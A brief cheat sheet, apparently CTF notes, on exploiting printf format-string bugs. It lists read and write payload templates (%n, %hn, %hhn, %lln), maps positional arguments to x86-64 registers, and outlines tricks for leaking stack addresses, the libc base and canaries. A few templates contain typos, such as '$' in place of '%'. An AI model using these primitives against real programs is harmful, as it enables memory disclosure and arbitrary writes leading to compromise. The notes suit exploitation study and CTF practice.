# 0x1 usage

take `printf` for example.

## x86

### read

```
'%{}$x'.format(index)           // read 4 bytes
'%{}$p'.format(index)           // read 4 bytes
'${}$s'.format(index)
```

### write

```
'%{}$n'.format(index)           // dereference，then write 4 bytes
'%{}$hn'.format(index)          // dereference，then write 2 bytes
'%{}$hhn'.format(index)         // dereference，then write 1 bytes
'%{}$lln'.format(index)         // dereference，then write 8 bytes
```

## x86-64

### read

```
'%{}$x'.format(index, num)      // read 4 bytes
'%{}$lx'.format(index, num)     // read 8 bytes
'%{}$p'.format(index)           // read 8 bytes
'${}$s'.format(index)
```

### write

```
'%{}$n'.format(index)           // dereference，then write 4 bytes
'%{}$hn'.format(index)          // dereference，then write 2 bytes
'%{}$hhn'.format(index)         // dereference，then write 1 bytes
'%{}$lln'.format(index)         // dereference，then write 8 bytes
```

- `%1$lx`: RSI
- `%2$lx`: RDX
- `%3$lx`: RCX
- `%4$lx`: R8
- `%5$lx`: R9
- `%6$lx`: first *QWORD* on the stack

# 0x2 trick

1. leak address of *stack*.
2. leak base address of *__libc_start_main*(meet with when exploit Linux heap in alictf-qual-2016-fb).
3. leak canary.
4. with the reference of neighbor ebp on the stack, we can meet the goal of arbitrary read&write in theory (pwnable.kr-fsb and rctf-qual-2015-nobug), but in fact, it is not practical.
